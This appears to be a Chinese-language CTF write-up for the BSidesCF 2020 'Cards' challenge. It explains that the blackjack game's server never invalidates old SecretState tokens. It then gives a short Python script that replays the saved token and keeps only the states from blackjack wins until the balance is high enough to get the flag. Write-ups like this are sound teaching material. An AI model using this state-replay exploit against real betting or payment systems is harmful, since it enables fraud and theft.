---
title: '[BSidesCF 2020]Cards'
date: 2024-11-20 20:11:47
tags:
categories: 刷题笔记
---

## [BSidesCF 2020]Cards

### 思路

我们在每次请求都会有一个SecretState参数，用来保存游戏状态，并且在客户端和服务端同步。这个参数没法篡改。每次请求，服务端都会生成一个新的SecretState，但是旧的SecretState并不失效，问题就出在于此。
游戏如果赢了，就更新SecretState，如果输了，则不更新SecretState。这样就可以达到类似一种分数只增不减的效果。

但是有个问题，下注之后要开牌的话，必须得用新的SecretState，而下注的时候分数已经扣了，这样输的状态依然存在。

这就需要利用21点里一个规则，如果先发的2张牌已经是21点（black jack），则直接赢。这种状态下可以省去开牌那一步。

首先在这个url下面获取一个secret，因为后面在出牌的时候需要使用
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/35f946949b4e3f9406a462570ecae3b5.png#pic_center)

然后在出牌那里看到这个api，不难做出来

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/b481abb78e479946601663f6c53f25ec.png#pic_center)

### WP

坐等分数达到以后获取flag即可

```php
import requests

start = "http://e55998dd-c347-4c45-b0c8-dc9ede19d51e.node3.buuoj.cn/api"
deal = start + "/deal"


# 开局
state = requests.post(start).json()["SecretState"]

while True:
    # 下注
    try:
        resp = requests.post(deal, json={"Bet": 500, "SecretState": state}).json()
    except:
        continue

    if resp['GameState'] == 'Blackjack':
        state = resp['SecretState']

    print(resp['Balance'])
    if resp['Balance'] > 100000:
        print(resp)
        break

```

